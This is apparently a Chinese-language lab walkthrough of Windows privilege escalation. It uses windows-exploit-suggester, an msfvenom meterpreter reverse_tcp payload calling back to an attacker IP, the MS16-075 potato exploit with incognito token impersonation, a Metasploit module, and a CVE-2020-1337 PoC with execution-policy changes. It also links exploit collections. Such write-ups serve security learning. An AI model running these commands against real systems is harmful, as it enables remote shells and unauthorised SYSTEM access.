### 一、windows-exploit-suggester

    
    
     **windows-exploit-suggester.py --update  从微软官方自动下载安全公告数据库，生成最新的漏洞列表**

再在靶机中 **systeminfo > win10.txt**

    
    
     **windows-exploit-suggester.py --database   第一步得到的xls文件 --systeminfo  第二步得到的win10.txt文件 > result.txt**

得到靶机可能存在的漏洞列表:

![1647393616_62313b502bfe5f7516d34.png!small?1647393616233](https://image.3001.net/images/20220316/1647393616_62313b502bfe5f7516d34.png!small?1647393616233)

近几年CVE-2021-1732可以通杀很多windows server

### 二、msf

第一步我们了解到靶机可能存在ms16-075漏洞，结合msf进行提权

msfvenom生成windows下的可执行文件，使用windows/meterpreter/reverse_tcp建立反向链接反弹shell：

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.177.128.4(攻击机ip)  LPORT=4444 -f exe > /root/exp/mu.exe

将mu.exe复制到被攻击的windows主机中并运行

![1647356527_6230aa6f745fed6fd7106.png!small](https://image.3001.net/images/20220315/1647356527_6230aa6f745fed6fd7106.png!small)

攻击机中开启msfconsole,使用exploit/multi/handler建立session

需要注意的是payload的设置

![1647356656_6230aaf03758c76b7f9d3.png!small](https://image.3001.net/images/20220315/1647356656_6230aaf03758c76b7f9d3.png!small)

攻击成功（截图里面是4433端口是我后来重新生成了exe，懒的重新截了，果咩）

![1647356799_6230ab7f80187ead37df9.png!small](https://image.3001.net/images/20220315/1647356799_6230ab7f80187ead37df9.png!small)

![1647356973_6230ac2d6f05c367e28f2.png!small](https://image.3001.net/images/20220315/1647356973_6230ac2d6f05c367e28f2.png!small)

这里是普通用户权限，靶机下载exp或者上传exp:

<https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075>

攻击机shell中运行potato.exe:

    
    
    execute -cH -f potato.exe -i

加载incognito功能

    
    
    use incognito

列出用户组和用户可用的令牌

    
    
    list_tokens -g
    list_tokens -u

再执行exp

    
    
    execute -cH -f potato.exe

再list_tokens -u 可以看到system的token, getuid得到：

![1647395061_623140f53fa9efdf0c891.png!small?1647395061293](https://image.3001.net/images/20220316/1647395061_623140f53fa9efdf0c891.png!small?1647395061293)

**********************************************************************************************************

还可以用msf内置的模块进行ms16-075的利用：

首先还是要获得一个session,同上面写的：

![1647398751_62314f5f57afdcc67fd14.png!small?1647398751447](https://image.3001.net/images/20220316/1647398751_62314f5f57afdcc67fd14.png!small?1647398751447)

background返回msf

search
ms16-075![1647399265_6231516152cd7465cf993.png!small?1647399265445](https://image.3001.net/images/20220316/1647399265_6231516152cd7465cf993.png!small?1647399265445)

用第二个 use 1 , 然后set payload set lport set lhost set session 等一系列set

![1647399444_62315214eb83175695ec7.png!small?1647399444958](https://image.3001.net/images/20220316/1647399444_62315214eb83175695ec7.png!small?1647399444958)

![1647399474_6231523215e168b7e8ae7.png!small?1647399474184](https://image.3001.net/images/20220316/1647399474_6231523215e168b7e8ae7.png!small?1647399474184)

失败了...... QAQ

******************************************************************************************************************

> 一些小知识：
>
> 得到session后，msf中有一个模块可以更精准的探测靶机中可能存在的漏洞：
>  
>  
>     use multi/recon/local_exploit_suggester  
>     > set session 1  
>     > run

![1647399070_6231509eef841e55834cb.png!small?1647399071284](https://image.3001.net/images/20220316/1647399070_6231509eef841e55834cb.png!small?1647399071284)

如本次扫描可以看到靶机存在 **CVE-2020-1337** 漏洞

>  **关于这个漏洞的详细解释：**
>
>  **https://bbs.pediy.com/thread-261557.htm**

下载poc文件：https://github.com/lyshark/Windows-exploits/blob/master/CVE-2020-1337.rar

在powershell中执行：

![1647416804_623195e498054c96df7b8.png!small?1647416804456](https://image.3001.net/images/20220316/1647416804_623195e498054c96df7b8.png!small?1647416804456)

    
    
    注意：如果powershell中无法直接运行ps1文件则先以管理员身份打开powershell  
    Get-ExecutionPolicy -List  
    set-executionpolicy remotesigned

![1647417231_6231978f581c7b5f90986.png!small?1647417231216](https://image.3001.net/images/20220316/1647417231_6231978f581c7b5f90986.png!small?1647417231216)

运行 .\poc1.ps

提示reboot后，关机，看c:\windows\sytem32中是不是存在phoneinfo.dll，如果有，运行wertrigger.exe

whoami得到system权限

![1647417761_623199a1ef2ab48362eb6.png!small?1647417761833](https://image.3001.net/images/20220316/1647417761_623199a1ef2ab48362eb6.png!small?1647417761833)

  

> 放一些windows提权链接：
>
> windows提权辅助工具：winpeas (看文件权限好用) 、windows_exploit_suggester.py
>
> Windows内核漏洞提权exp合集：https://github.com/SecWiki/windows-kernel-exploits
>
> Windows 下的提权大合集：https://github.com/lyshark/Windows-exploits
>
> windows提权工具：https://github.com/klsfct/getshell
>
> 这几个可以互相补充着看，内容有点相似

